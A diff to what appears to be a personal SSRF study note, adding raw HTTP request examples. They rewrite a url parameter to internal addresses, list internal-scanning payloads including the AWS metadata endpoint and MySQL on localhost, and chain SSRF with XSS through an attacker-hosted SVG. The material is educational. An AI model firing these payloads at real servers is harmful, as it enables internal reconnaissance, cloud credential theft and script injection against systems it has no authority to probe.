@@ -24,12 +24,26 @@ By changing `product.txt` to `passwords.txt` or `http://localhost:8080`, an atta
 
 ## 🔗 **SSRF for Recon:**
 ```http
-http://internal-ip:port
+SSRF can be used for recon like this: http://internal-ip:port
+
+lets take the first vulnarable endpoint
+GET /example?url=product.txt HTTP/1.1
+Host: example.com
+User-Agent: example
+Accept: */*
+Connection: close
+we can replace (product.txt) with http://internal-ip:port
+which will look like this:
+GET /example?url=http://192.168.1.1:80 HTTP/1.1
+Host: example.com
+User-Agent: example
+Accept: */*
+Connection: close
 ```
 
 ---
 
-## 🚦 **Common Payloads:**
+## 🚦 **Common Payloads For Internal Scanning:**
 - `http://localhost:8000/admin`
 - `http://127.0.0.1:3306` (MySQL)
 - `http://169.254.169.254/latest/meta-data` (AWS Metadata)
@@ -51,9 +65,21 @@ GET /vulnerable-endpoint?url=http://your-collaborator-server.com
 ---
 
 ## 🔗 **Chaining SSRF with Other Bugs:**
-SSRF can be combined with vulnerabilities like **XSS**:
+you can chain ssrf with bugs like **XSS** (Check my xss note for more detailed info about it):
 ```http
+the endpoint will look like this:
+GET /example.txt?file=product.txt HTTP/1.1
+Host: localhost:8000
+User-Agent: example
+Accept: */*
+Connection: close
+
+you can make the server-side app retrieve a file that you hosted on your server which has malicious code Like this:
 GET /example.txt?file=http://yourWebsite/XSS.svg HTTP/1.1
+Host: localhost:8000
+User-Agent: example
+Accept: */*
+Connection: close
 ```
 
 ---
